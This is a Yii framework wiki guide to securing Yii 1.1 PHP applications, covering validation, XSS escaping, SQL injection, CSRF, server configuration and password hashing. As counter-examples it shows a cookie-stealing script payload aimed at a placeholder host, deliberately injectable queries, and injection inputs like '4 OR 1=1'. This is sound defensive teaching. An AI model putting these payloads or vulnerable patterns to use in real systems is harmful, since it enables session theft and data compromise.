# How to write secure Yii1 applications | Wiki | Yii PHP Framework

> **Fonte / Source:** https://www.yiiframework.com/wiki/275/how-to-write-secure-yii1-applications

---

## [How to write secure Yii1 applications](wiki__275__how-to-write-secure-yii1-applications.md)

80    0

114

Viewed: 341 570 times

Version: 1.1

Category: [How-tos](wiki__index.md)

- [authentication](wiki__index.md)
- [authorization](wiki__index.md)
- [security](wiki__index.md)
- [SQL injection](wiki__index.md)
- [XSS](wiki__index.md)

Written by: [![François Gannaz](/image/user/default_user.svg) François Gannaz](https://www.yiiframework.com/user/3121)

Updated by: [![François Gannaz](/image/user/default_user.svg) François Gannaz](https://www.yiiframework.com/user/3121)

Created: Nov 22, 2011

Updated: 5 years ago

1. [General principles](#general-principles)
2. [Validating the user input](#validating-the-user-input)
3. [HTML output and XSS](#html-output-and-xss)
4. [SQL Injections](#sql-injections)
5. [Cross-site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
6. [Configure the web server](#configure-the-web-server)
7. [Authorization](#authorization)
8. [Authentication](#authentication)
9. [Useful Tools](#useful-tools)

> **Warning:**
> While this security guide tries to be quite complete, is not exhaustive.
> If security matters for you, you ought to check several other references.

#### General principles [¶](#general-principles)

- Validate the user input (see below for details).
- Protect (escape) your application output according to context (see below for a few output types, mostly HTML and SQL).
- Test your application in debug mode.  
  Set the constant `YII_DEBUG` to true (by default, it is defined in `index.php`)
  and put alongside `error_reporting(E_ALL);`.
  Then errors and warnings will stop the execution and Yii will display the message, the source code and the call stack.
  Even an undefined key in an array (which is just a "E\_NOTICE" level) can cause security problems.
- Disable the debug mode in production.  
  Make sure your error messages don't contain sensitive information.
- Whenever possible, filter by white-list instead of by black-list,
  i.e. allow only data that is in an authorized list.
- In production, keep logs. Parse them regularly for warnings and errors.  
  There are two levels of logs : application logs (handled by Yii) and server logs (handled by PHP and usually Apache).
  Yii logs are described in [The Definitive Guide to Yii, Logging](http://www.yiiframework.com/doc/guide/1.1/en/topics.logging).
  PHP logs are usually on by default. Please check your server configuration and your rights on the file system for accessing these log files.

#### Validating the user input [¶](#validating-the-user-input)

##### How it works [¶](#how-it-works)

If a user can add its birth date to its profile, you have to make sure he gives
a valid date. It's not only helpful to prevent mistypes, it also provides better
security. Verifying the input is in the form "1951-01-25" will forbid dangerous texts
that try to attack your database's SQL or your website's HTML.
Validation is not a perfect protection, but it's an excellent first step.

##### Client-side validation [¶](#client-side-validation)

Validating a form with JavaScript has absolutely no impact on the security!
It should only be meant as a way to enhance the interface and its comfort of use.

The HTML restriction are the same. For instance, if a page has a form containing:

```
<input type="hidden" name="id" value="1" />
<input type="text" name="date" size="10" />
<select name="list"><option>1</option><option>2</option></select>
```

The data received in the PHP application can contain anything.
The "id", "date" and "list" fields can be big strings or arrays.
For example, a user can modify the HTML source of the page to replace both fields by text areas.

##### How Yii can help [¶](#how-yii-can-help)

Yii provides specific ways that can be used instead or along the usual PHP ways.
For reference, the recommended way without Yii is mostly to use type casts and the
[Filter extension](http://fr.php.net/manual/fr/book.filter.php).

###### Validating through a model [¶](#validating-through-a-model)

Most of the times, the user input will be sent to a model.
Models will generally extend `CFormModel` or `CActiveRecord`.
Both of them derive from the class [CModel](http://www.yiiframework.com/doc/api/1.1/CModel).
This class has a method `rules()` that declares how the validation will process.
The additional tests can be done with behaviors or the `beforeValidate()` method.

The controller:

```
<?php
// In the controller
$model = new Comment;
$model->attributes = $_POST['Comment'];
if ($model->save()) { // validates and save
	$this->redirect(array('view', 'id' => $model->id));
} else {
	// Could not validate, or could not save
}
```

The model:

```
<?php
// In the model
class Comment extends CActiveRecord
{
	public function rules()
	{
		return array(
			array('parent', 'numerical', 'integerOnly' => true),
			array('strangedata', 'customValidateForStrangedata'),
			array('description', 'length', 'max' => 255),
		);
	}
	
	// extended validation, run before the rules set above
	protected function beforeValidate()
		if (!empty($this->description) && substr_count($this->description, '"') % 2 !== 0) {
			$this->addError("description", "Odd number of quotes");
			// return false; // stop validation
		}
		return parent::beforeValidate();
	}
	
	/** @return boolean Continue the validation process? */
	protected function customValidateForStrangedata($attribute, $params)
	{
		$this->addError($attribute, "validation failed");
		return false;
	}
```

You should pay extra care to your validation.
It keeps your data clean, and that not only useful for security.
Many kind of rules are already declared, and you can add your own.
You can also apply some rules only in a given context, e.g. validate a field only when the record is modified ("update" scenario"), not when the record is created ("insert" scenario).

###### To go further: [¶](#to-go-further)

- The Definitive Guide to Yii 1.1: [Form Models, declaring validation rules](http://www.yiiframework.com/doc/guide/1.1/en/form.model#declaring-validation-rules)
- The Definitive Guide to Yii 1.1: [Active Record, data validation](http://www.yiiframework.com/doc/guide/1.1/en/database.ar#data-validation)
- Wiki: [Reference: Model rules validation](http://www.yiiframework.com/wiki/56/reference-model-rules-validation)
- API: [CModel](http://www.yiiframework.com/doc/api/1.1/CModel)
- [Yii 1.1 validator cheat-sheet](http://yii.googlecode.com/files/yii-1.1.0-validator-cheatsheet.pdf)

###### Validating in a controller [¶](#validating-in-a-controller)

Some light user input will be handled directly by the controller.
In this case, **you should use a PHP type cast**.
This happens frequently for numeric IDs where you should use `(int)`.

```
<?php
// insecure (see below for restrictions)
$model = Post::model()->findByPk($_GET['id']);
// secure
$model = Post::model()->findByPk((int) $_GET['id']);
```

If the input is not expected to be an integer, then consider making go through a model validation.

###### Side note on the last example [¶](#side-note-on-the-last-example)

In fact, Yii will help, even in the first case.
The method [findByPk()](http://www.yiiframework.com/doc/api/1.1/CActiveRecord/#findByPk-detail)
uses the table schema to ensure that a numeric column only gets numeric criteria.
See the [SQL Injection](#hh11) section for more details.
Yet, there are cases where this automatic protection might not be enough.
What if a malicious user enters the query `comment/delete?id[]=2\&id[]=1`?
Then `$_GET['id']` would become an array, and if this id is not validated,
it can induce strange effects, and possible security breaches (but not with `findByPk`).

#### HTML output and XSS [¶](#html-output-and-xss)

If the application prints unfiltered user input inside a HTML page, then it allows a
malicious user to change the display of this page, and to inject client code (usually JavaScript)
that can be run by other users.
One typical use of these XSS attacks is to steal user sessions.

One note on vocabulary: filtering data for security concerns is often called *escaping*.

##### Example [¶](#example)

Here is a extract of a view. The page just shows a user profile.

```
<h2>Profile of <?php echo $user->name ?></h2>
Other unfiltered and unsecure outputs:
<a href="/posts?name=<?php echo $user->login ?>"
   title='<?php echo $user->name ?>'>See my posts</a>
```

Why is this dangerous? Suppose the user's name is:

```
Joe<script>document.write('<img src="http://x.com/save.php?cookie='+getCookie()+'" />');function getCookie(){...}</script>
```

Then everyone that consults this profile will send an HTTP request for an external image,
and this request will contain data describing the visitor's cookies. This is an XSS attack.

PHP provides several functions that protect the output.
The most useful one is `htmlspecialchars()` but just in the example above,
`rawurlencode()` and `htmlspecialchars(, ENT_QUOTES)` would also be necessary.

##### How Yii can help [¶](#how-yii-can-help)

###### Plain text [¶](#plain-text)

**If you want to print plain text in a HTML page, use `CHtml::encode()`.**
Here is an example:

```
<h2>Profile of <?php echo CHtml::encode($user->name) ?></h2>
```

This function is in fact a wrapper on `htmlspecialchars()` with your application's characters set
(to be exact, it's not a charset but a character encoding).
So if your texts are not (yet) in UTF-8, you should declare a charset in the global config
(e.g. `'charset' => 'ISO-8859-1'` in the first level of "protected/config/main.php").

You may want to apply `strip_tags()`, to remove HTML/XML tags before escaping.
Beware, this function is not secure, so do not use it without `CHtml::encode()`.

###### Rich text (HTML) [¶](#rich-text-html)

If you want to allow HTML in the user input, then you have to display it raw.
So **you should filter the HTML data** (before saving it or after reading it, at your choice, though the former is recommended for performance reasons).
Do not try to filter it yourself, several PHP libraries already exist.
The most well-known is [Html Purifier](http://htmlpurifier.org/), and it has been incorporated in Yii.
For details, see the section [Security, XSS](http://www.yiiframework.com/doc/guide/1.1/en/topics.security#cross-site-scripting-prevention)
in "The Definitive Guide to Yii".

```
<li class="comments">
<?php
$purifier = new CHtmlPurifier();
$purifier->options = array(
	'HTML.Allowed' => 'p,a[href],b,i',
);
foreach (Comment::model()->findAll() as $comment) {
	// This can be dangerous
	//echo "<li>" . $comment->text . "</li>\n";
	
	// Safe output (but slow)
	echo "<li>" . $purifier->purify($comment->text) . "</li>\n";
}
?>
</li>
```

Allowing the user to enter HTML text can be useful, especially with Rich Text Editors like TinyMCE or CkEditor,
but you may instead **consider using templating languages**, like Markdown or wiki syntax.
Regarding security, the benefit is that the application converts to HTML, so the risk
of XSS is low.

```
<div class="comment">
<?php
$md = new CMarkdownParser();
echo "<div>" . $md->transform($comment) . "</div>";
?>
</div>
```

###### To go further: [¶](#to-go-further)

- [HTML Purifier's doc](http://htmlpurifier.org/docs). The end-user documentation contains a few thematic tutorials, like ["Customize"](http://htmlpurifier.org/docs/enduser-customize.html). The [Configuration Reference](http://htmlpurifier.org/live/configdoc/plain.html) lists all the options you can use with [CHtml::Purifier](http://www.yiiframework.com/doc/api/1.1/CHtmlPurifier) but it lacks examples.
- [CMarkdown](http://www.yiiframework.com/doc/api/1.1/CMarkdown/) and [CMarkdownParser](http://www.yiiframework.com/doc/api/1.1/CMarkdownParser/)

##### Special cases: URLs, CSS, etc [¶](#special-cases-urls-css-etc)

###### URL [¶](#url)

To escape a string in an URL:

- use `rawUrlEncode()` for url parts,
- use `urlEncode()` for url parameters.

Here is an example of several cases in JavaScript and HTML:

```
<script>var a = "http://x.com/<?php echo rawUrlEncode($query) ?>"; </script>
<a href="/search/<?php echo rawUrlEncode($query)) ?>">Escape url parts</a>
<a href="/?param=<?php echo urlEncode($param) ?>">Escape URL parameters</a>
<a href="<?php echo CHtml::encode($url . "&param=" . urlEncode($param)) ?>">Escape whole URLs</a>
```

`CHtml::encode()` cannot be used alone here because it could produce an invalid URL, for example with
`$query = '?x="N & B"'`. But it cannot be removed since ampersands "&" have to be replaced by "&amp;".

##### CSS [¶](#css)

Use [Html Purifier](http://htmlpurifier.org/).
See the section on "Rich text (HTML)".

##### JavaScript [¶](#javascript)

If you need to write from PHP to JavaScript, you should use the static methods of [CJavaScript](http://www.yiiframework.com/doc/api/1.1/CJavaScript).

```
<?php
$messages = array("Rock'n roll", 'Say "hello"');
$title = "D'accord";
Yii::app()->clientScript->registerScript('snippet', "
function displayMsg() {
	var messages = " . CJavaScript::encode($messages) . ";
	var title = '" . CJavaScript::quote($title) . "';
	// ...
}
");
```

There is a special case where you do not want Yii to quote a string that is already valid in JS.
In this case, you have to prefix your string with "js:", the prefix will be removed and the rest will be unchanged.

```
<?php
$this->widget(
	'zii.widgets.jui.CJuiAutoComplete',
	array(
		'name' => 'field_name', // Yii applies CJavaScript::quote to each value
		'source' => 'js:function(request, response) { $.ajax({...}) }', // "js:" before the JS code
```

#### SQL Injections [¶](#sql-injections)

##### How it works [¶](#how-it-works)

When some user data is put unfiltered in a SQL query, it allows a malicious user
to send its own SQL in the query.

```
<?php
// warning, dangerous code
Yii::app()->db
	->createCommand("DELETE FROM mytable WHERE id = " . $_GET['id'])
	->execute();
$comments = Comment::model->findAll("user_id = " . $_GET['id']);
```

If the GET parameter id is "4 OR 1=1" then someone who has the right to delete comment #4 will probably be able to delete all the other comments (it depends on how the authorization is granted, but that's another story).
In the second request, it would be possible to read the content of the whole DB with input like "2 UNION SELECT ...".

##### How Yii can help [¶](#how-yii-can-help)

###### Use a PHP syntax instead of raw SQL [¶](#use-a-php-syntax-instead-of-raw-sql)

Instead of the code of the example above, what follows is far more secure:

```
<?php
// still lacks validation (see "Validating user input" above), but more secure
MyModel::model()->findByPk($_GET['id'])->delete();
// uses validation with a type cast
$comments = Comment::model->findAllByAttributes(array('user_id' => (int)$_GET['id']);
```

This is a general principle: if you build your SQL condition in pure text, you take more risks than a more PHP approach.
For most DB functions, **prefer array parameters to string parameters**.
Here is another example using PHP arrays:

```
<?php
// warning: potential sql injection
$comments = Comment::model->findAll("post_id = $postId AND author_id IN (" . join(',', $ids) . ")");
// secure (note how an array value is gives a "IN" since Yii
$comments = Comment::model->findAllByAttributes(array("post_id" => $postId, "author_id" => $ids));
```

###### Prepared statements [¶](#prepared-statements)

The are still cases where writing raw SQL is needed.
Consider a simple query that has 2 parameters:

```
SELECT CONCAT(prefix, title) AS title, author_id, post_id, submit_date
  FROM t_comment
  WHERE (date > '{$date}' OR date IS NULL) AND title LIKE '%{$text}%'
```

There are 2 ways to secure this:

1. Escape each parameter (not recommended).
2. Use a prepared statement (recommended).

If you really want to escape each parameter, you can use [CDbConnection::quoteValue()].
For example, `"date > '{$date}'"` would become `"date > " . Yii::app()->db->quoteValue($date)`.

Prepared statements is a way to declare parameters in your SQL.
Depending on your configuration, the incomplete query will be compiled by the SQL server,
then the values will be inserted at the right places (the actual behavior may vary because this process could be emulated from PHP, especially if the SQL engine doesn't allow it).
**Prepared statements removes any risk of SQL injection in the parameters.**
(Yet, beware, not everything is a parameter).

There are two ways to write this in Yii:

```
<?php
// Note the parameters are written :param without surrounding quotes
$sql = "SELECT CONCAT(prefix, title) AS title, author_id, post_id, date "
	. "FROM t_comment "
	. "WHERE (date > :date OR date IS NULL) AND title LIKE :text"

// 1st way, using explicit binds
$command = Yii::app()->db->createCommand($sql);
$command->bindParam(":date", $date, PDO::PARAM_STR);
$command->bindParam(":text", "%{$text}%", PDO::PARAM_STR);
$results = $command->execute();

// second way
$command = Yii::app()->db->createCommand($sql);
$results = $command->execute(array(':date' => $date, ':text' => "%{$text}%"));
```

The first syntax with explicit bindings is a bit heavier, but it has the advantage of defining the parameter's type.

When retrieving models from the DB, the syntax is simple:

```
<?php
$comments = Comment::model->findAllBySql($sql, array(':date' => $date, ':text' => "%{$text}%"));
```

If you don't feel at ease with the Yii way to query databases, please read the whole tutorial [Working with Databases](http://www.yiiframework.com/doc/guide/1.1/en/database.overview) in "The Definitive Guide to Yii".
The section [Database Access Objects](http://www.yiiframework.com/doc/guide/1.1/en/database.dao) has more details on binding parameters.

###### Side note on LIKE conditions [¶](#side-note-on-like-conditions)

Even if no SQL injection in possible in the previous queries, there is still room for improvement.
The SQL function `LIKE` has a special treatment for the characters `_` and `%`.
In many cases, this is not a problem, with mostly unexpected results.
But if the data queried is huge, then transforming a `"begin%"` condition into `"%s%a%"` condition can make the query so heavy that it slows the SQL server, because no index can be used for the later.
So **you should protect the characters `%` and `_`** when the user input is going into a LIKE condition, for example with `str_replace()`.
See further for example of how [CDbCriteria::compare()] or [CDbCriteria::addSearchCondition()] can simplify this.

###### Side note on positional parameters [¶](#side-note-on-positional-parameters)

As of now (Yii 1.1.8), the framework does not recognized *positional parameters* marked with `?`.
You have to used *named parameters* whose names begin with `:`.

###### Side note on performance [¶](#side-note-on-performance)

A lone prepared statement is a bit slower than a non prepared one.
This is probably *not* a performance bottleneck for your application.
But if you want to run several times the same query with variable bound parameters, then the prepared statements will be faster.
Of course, none of this does apply when PHP emulates preparation.

###### When prepared statements aren't enough [¶](#when-prepared-statements-arent-enough)

As written above, prepared statements remove any risk of SQL injection in the parameters.
Alas, there will be times when you need to use variables for parts of the SQL query that cannot use prepared statements.

```
SELECT *
  FROM {$mytable}
  WHERE {$myfield} LIKE '{$value}%' AND post_date < {$date}
  ORDER BY {$myfield}
  LIMIT {$mylimit}
```

The traditional way to solve this problem in pure PHP is to have white-lists of accepted values for each part.
But Yii provide several ways to help.
The first one is that Yii knows your DB schema, so you can write:

```
<?php
if (!Comment::model()->hasAttribute($myfield)) {
	die("Error");
}
```

A very specific solution to build a secure SQL query is to use the "Query Builder", available since Yii 1.1.6.
This is a way to write a complete SQL query in pure PHP, but it cannot be mixed with other approaches (raw SQL, CDbCriteria, etc).
See the section [Query Builder](http://www.yiiframework.com/doc/guide/1.1/en/database.query-builder) in "The Definitive Guide to Yii".

Most of the time, your expected result is to be parsed as models, so you can use `find*()` methods with [CDbCriteria] to build a more secure query.
For example:

```
<?php
// Yii applies some validity checks when the query is not raw SQL
$criteria = new CDbCriteria(
    array(
        'order' => $myfield,
        'limit' => $mylimit,
    )
);
$criteria->compare($myfield, $value, true); // LIKE % escaped($value) %
$criteria->compare('post_date', '<:date');
$criteria->params = array(':value' => $value, ':date' => $date);
$comments = Comment::model()->findAll($criteria)
```

This is especially useful if you intend to use [CGridView] which is what Gii (the official scaffolding tool) suggests.
[CGridView] expects a [CDataProvider] which uses [CDbCriteria], so you don't have to pay too much attention to the user search input.

To be complete, here is another syntax for the previous example:

```
<?php
// Yii applies some validity checks when the query is not raw SQL
$criteria = new CDbCriteria();
$criteria->order = $myfield;
$criteria->limit = $mylimit;
$criteria->addSearchCondition($myfield, $value, true); // true ==> LIKE '%...%'
$criteria->addCondition("post_date < :date");
$comments = Comment::model()->findAll($criteria, array(':value' => $value, ':date' => $date));
```

##### Summary on SQL injection [¶](#summary-on-sql-injection)

In the following lists, the firsts choices are the easiest to secure,
but it doesn't mean the last items are not secure.

- When results are models, chose the first element of the list that matches your needs:

  1. [CActiveRecord::findByPk()] or [CActiveRecord::findAllByPk()]
  2. [CActiveRecord::findByAttributes()] or [CActiveRecord::findAllByAttributes()]
  3. `X::model()->find($criteria, array(':param1' => $value1))` or `->findAll(...)`
  4. `X::model()->find($sql, array(':param1' => $value1))` or `->findAll(...)`
  5. `X::model()->findBySql($sql, array(':param1' => $value1))` or `->findAll(...)`
- When results are not model, use prepared statements:

```
<?php
$r = Yii::app()->db
    ->createCommand($sql)
    ->queryAll(array(':param1' => $value1));
```

And don't forget to validate the input before this!

#### Cross-site Request Forgery (CSRF) [¶](#cross-site-request-forgery-csrf)

See [The Definitive Guide to Yii, CSRF](http://www.yiiframework.com/doc/guide/1.1/en/topics.security#cross-site-scripting-prevention).

Please note that HTTP requests that modify the server state (create, update, delete) should be with the POST protocol.
This is a good practice, as recommended by REST, and it helps web browser to prevent accidental re-send of these requests.
But a POST request in itself does not prevent CSRF, it provides almost no improvement on security.
Fortunately, Yii has a mechanism (disabled by default) that can be used to protect them from forgery.

#### Configure the web server [¶](#configure-the-web-server)

This section will only consider a UNIX (Linux, BSD, OSX) web server Apache with PHP as a module.
Other configurations (Windows, nginx, PHP-fpm, etc) may require different settings, though the principles are the same.

##### Set up different environments [¶](#set-up-different-environments)

When Yii runs with the constant `YII_DEBUG` set to true, it can show valuable information to an attacker
(setting aside the performance penalty).
For instance, suppose an attacker finds a validation miss in your application:
when a form is spoofed to send an array value in a field, a PHP function will receive incorrect parameters.
In debug mode, Yii will then print the call stack, with the context of each call made in user code.

Unfortunately, by default the debug mode is set up in the `index.php` file of your application.
So the code has to be changed when running a development, a testing or a production instance.
One solution can be to use a DVCS to track local changes and rebase them (fast-forward in git jargon).
The drawback is that the various configurations are handled locally, in several branches.

The recommended solution is to rewrite the `index.php` file so that it reads the debug configuration:

- from an external file,
- or from the web server environment.

Apache can set environment variables with the syntax

```
SetEnv YII_ENV testing
```

This can be set in the global configuration files (in a VirtualHost or Directory),
or in a `.htaccess` file.
Then PHP can access this variable through `$_SERVER["YII_ENV"]`
and default to "production mode" if it isn't set.

##### For a Yii application [¶](#for-a-yii-application)

**The directory containing the framework should not be under the document root of your server** (there is no reason a user could access to files like "yiilite.php" in its web browser).

**Three directories must be writable** by the web server: "assets", "protected/data" and "protected/runtime".
**The web server should only have read access to everything else.**
This way, an attacker could only create/modify a file in these directories.
The folder "assets" is especially dangerous since it is writable, and there is a direct HTTP access to it.
Therefore, the PHP files it contains should not be interpreted but treated as plain text (see the example below).

Yii's default application have ".htaccess" files to forbid direct web access to "protected/" and "themes/classic/views/".
It is a bit safer (and faster) to put this configuration in the global configuration of Apache.
Here is an example that also disables PHP files in "assets/".

```
# Example config for Yii-myapp and Apache
# Please set the pathes to their right values

# put the application in some custom url
# (instead of an Apache alias, a symbolic link can be used)
Alias /web/path/for/myapp "/home/myapp/www"

<Directory "/home/myapp/www">
	AllowOverride None
</Directory>

<Directory "/home/myapp/www/protected">
	Deny from All
</Directory>

<Directory "/home/myapp/www/assets">
	php_admin_flag engine off
	Options -Indexes
</Directory>
```

Instead of the previous configuration, here is an example of putting a Yii application in a Virtual Host. Each securing directive has an explaining comment.

```
# Example config for Yii-myapp as an Apache VirtualHost
# Please set the paths and the host name to their right values

<VirtualHost *:80>
	ServerName myapp.com
	DocumentRootAlias /home/myapp/www

	ErrorLog /var/log/apache2/myapp-error.log
	CustomLog /var/log/apache2/myapp-access.log common

	<Directory "/home/myapp/www">
		Options +FollowSymLinks
		# These 2 lines are useless with modern PHP
		php_flag register_globals Off
		php_flag gpc_magic_quotes Off
		# Forbid .htaccess to change settings
		AllowOverride None

		<IfModule mod_rewrite.c>
			# The following block is for masking "index.php" in the url
			# To enable it, configure the app: urlManager.showScriptName = false
			IndexIgnore */*
			RewriteEngine on
			RewriteCond %{REQUEST_FILENAME} !-f
			RewriteCond %{REQUEST_FILENAME} !-d
			RewriteRule . index.php
		</IfModule>
	</Directory>

	# Forbid direct access to this directory
	<Directory "/home/myapp/www/protected">
		Deny from All
	</Directory>

	# protect several non-PHP directories
	<DirectoryMatch "/home/myapp/www/(assets|css|images|js)$">
		# Forbid execution of PHP scripts
		php_admin_flag engine off
		# Forbid listing of files
		Options -Indexes
	</DirectoryMatch>
</VirtualHost>
```

##### For every PHP project [¶](#for-every-php-project)

A few useful directives:

| Directive | Comment |
| --- | --- |
| `allow_url_include` | Should be off (PHP 5.2). |
| `register_globals` | This is obsolete and dangerous. **Should be off.** |
| `magic_quotes_gpc` | Important for many PHP applications, but Yii negates its effect. **Should be off.** |
| `open_basedir` | Can restrict PHP to access only some directories. Use with caution. |
| `display_errors` | Should be off in production. |
| `error_reporting` | Should always include at least `E_ERRORS`. See the [official documentation](http://php.net/manual/en/errorfunc.configuration.php#ini.error-reporting). |

This directives can be set in the global "php.ini" file.
If Apache has `AllowOverride Options`, then ".htaccess" can be used.

```
# .htaccess file
php_flag display_errors off
php_value error_reporting -1
```

One can also use `php_admin_flag` and `php_admin_flag` to set config parameters that can't be changed dynamically with ".htaccess" or `ini_set()`.
Here is an example in an Apache config file.

```
# Apache config file
<Directory "/var/www/myapp">
	php_admin_value open_basedir /var/www/myapp/:/tmp/
</Directory>
```

SSL is out of the scope of this wiki page.

#### Authorization [¶](#authorization)

Authorization is ensuring users only have access to the resources they have permissions on.
This is a lengthy subject, and Yii provides many useful classes to handle permissions and roles.
To learn about this, please read *The Definitive Guide to Yii* from
[Access Control Filter](http://www.yiiframework.com/doc/guide/1.1/en/topics.auth#access-control-filter)
to
[Using Business Rules](http://www.yiiframework.com/doc/guide/1.1/en/topics.auth#using-default-roles).

Another useful resource is in the wiki: [Getting to Understand Hierarchical RBAC Scheme](http://www.yiiframework.com/wiki/136/getting-to-understand-hierarchical-rbac-scheme). For a more practical but limited case, see [CPhpAuthManager - how it works](http://www.yiiframework.com/wiki/253/cphpauthmanager-how-it-works-and-when-to-use-it/).

There are also [several](http://www.yiiframework.com/extension/rights/) [extensions](http://www.yiiframework.com/extension/rbam/) [that](http://www.yiiframework.com/extension/srbac/) can help you to set up the authorization system of your application.

#### Authentication [¶](#authentication)

##### Password strength [¶](#password-strength)

The validation rule must reject any weak password.
Writing its own validation method is easy: just require a minimum size, and check that different classes of characters are present.
You can also use a ready-made solution, the extension [epasswordstrength](http://www.yiiframework.com/extension/epasswordstrength).

```
<?php
class User extends CActiveRecord
{
	public function rules()
	{
		return array(
			array('password', 'checkPasswordStrength'),
		);
	}
	
	protected function checkPasswordStrength($attribute, $params)
	{
		$password = $this->$attribute;
		$valid = true;
		$valid = $valid && preg_match('/[0-9]/', $password); // digit
		$valid = $valid && preg_match('/\W/', $password); // non-alphanum
		// ... other rules ...
		$valid = $valid && (strlen($password) > 7); // min size
		if ($valid) {
			return true;
		} else {
			$this->addError($attribute, "Not secure enough");
			return false;
		}
	}
```

Providing a client-side validation in JavaScript can be useful, since the user will know immediately if its password is secure. But don't forget this must not replace the validation in PHP. In fact, it makes validation a bit harder because your PHP validation must be the same as your JS validation. To be precise, it can be weaker than the JS, but it has to follow similar criteria.
There is also an extension for this, [estrongpassword](http://www.yiiframework.com/extension/estrongpassword).

##### Encrypting passwords [¶](#encrypting-passwords)

This section considers only internal authentication, i.e. through passwords managed by the application.
It does not consider LDAP, SSO, OpenID, or any other external service.

Since PHP 5.4, PHP has password functions.
With Yii, it can be as simple as the following "User" model:

```
<?php
class User extends CActiveRecord
{
	public function validatePassword($password)
	{
    	// $password is the user input
		return password_verify($password, $this->password);
	}

	public function beforeSave()
	{
		// Replace the raw password with the hashed one
        // Beware of double-encoding when you update a record!
		if (!empty($this->password)) {
			$this->password = password_hash($this->password, PASSWORD_DEFAULT);
		}
		return parent::beforeSave();
	}
```

#### Useful Tools [¶](#useful-tools)

There are several tools that can detect potential security breaches in your application.
First, some web security scanners:

- [Skipfish](https://code.google.com/p/skipfish/).
  Well-documented, powerful and easy to run.
  Like any other scanner, it will detect some false-positive issues, be careful when interpreting.
- [Nikto](http://www.cirt.net/nikto2).
  This is probably the most well-known.
- [W3af, Web Application Attack and Audit Framework](http://w3af.sourceforge.net/).
  This is a package of security tools with a common interface. It has both a CLI and GUI.
  It comes with an extensive documentation.

Then a scanner of a different type:

- [RatProxy](https://code.google.com/p/ratproxy/).
  This open-source tool is a proxy that will analyze your traffic to find potential security problems.

There are many other security tools, but this should be more than enough for any beginner.
And if you're experimented enough with web security, please contribute!
